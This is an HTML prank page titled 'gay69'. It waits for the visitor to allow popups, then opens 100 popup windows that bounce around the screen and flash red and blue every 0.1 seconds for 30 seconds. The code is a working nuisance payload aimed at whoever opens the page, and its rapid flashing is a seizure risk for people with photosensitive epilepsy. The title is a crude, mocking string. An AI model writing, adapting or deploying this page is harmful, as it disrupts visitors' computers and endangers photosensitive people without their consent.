<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>gay69</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        h1 {
            font-size: 2rem;
        }
    </style>
</head>
<body>
    <h1>Opening...</h1>
    <script>
        function checkPopupsAllowed() {
            // Try to open a test popup
            const test = window.open('about:blank', '_blank', 'width=1,height=1');
            if (test === null || typeof test === "undefined") {
                return false;
            } else {
                test.close();
                return true;
            }
        }

        function bounceWindow(popup, width, height) {
            if (!popup) return;

            // Initialize position and velocity
            let left = Math.random() * (window.screen.availWidth - width);
            let top = Math.random() * (window.screen.availHeight - height);
            let velocityX = 15; // Horizontal speed
            let velocityY = 15; // Vertical speed

            const interval = setInterval(() => {
                // Update position
                left += velocityX;
                top += velocityY;

                // Check for collisions with screen edges and reverse direction if needed
                if (left <= 0 || left >= window.screen.availWidth - width) {
                    velocityX *= -1; // Reverse horizontal direction
                }
                if (top <= 0 || top >= window.screen.availHeight - height) {
                    velocityY *= -1; // Reverse vertical direction
                }

                // Move the popup
                try {
                    popup.moveTo(left, top);
                } catch (e) {
                    clearInterval(interval); // Stop movement if popup is inaccessible
                }
            }, 30); // Fast bouncing (interval of 30ms)
        }

        function startCountdown() {
            let seconds = 1;
            const countdownElem = document.getElementById('countdown');
            const interval = setInterval(() => {
                seconds--;
                if (countdownElem) countdownElem.textContent = seconds;
                if (seconds <= 0) {
                    clearInterval(interval);

                    // Open 100 bouncing windows
                    for (let i = 0; i < 100; i++) {
                        const popup = window.open(
                            'about:blank',
                            `_blank`,
                            `width=400,height=300,left=0,top=0`
                        );
                        if (popup) {
                            // Set the title of the popup
                            popup.document.title = "gay69";

                            // Write flashing lights content
                            popup.document.write(`
                                <html>
                                    <head><title>gay69</title></head>
                                    <body style="margin:0;height:100vh;display:flex;justify-content:center;align-items:center;background-color:red;">
                                        <script>
                                            let isRed = true;
                                            setInterval(() => {
                                                document.body.style.backgroundColor = isRed ? 'blue' : 'red';
                                                isRed = !isRed;
                                            }, 100); // Flash every 0.1 seconds
                                            setTimeout(() => { window.close(); }, 30000); // Close after 30 seconds
                                        <\/script>
                                    </body>
                                </html>
                            `);

                            // Start bouncing the window
                            bounceWindow(popup, 400, 300);
                        }
                    }
                }
            }, 1000);
        }

        window.onload = function() {
            if (checkPopupsAllowed()) {
                startCountdown();
            } else {
                const h1 = document.querySelector('h1');
                if (h1) {
                    h1.textContent = "Please allow popups and reload the page.";
                }
            }
        };
    </script>
</body>
</html>
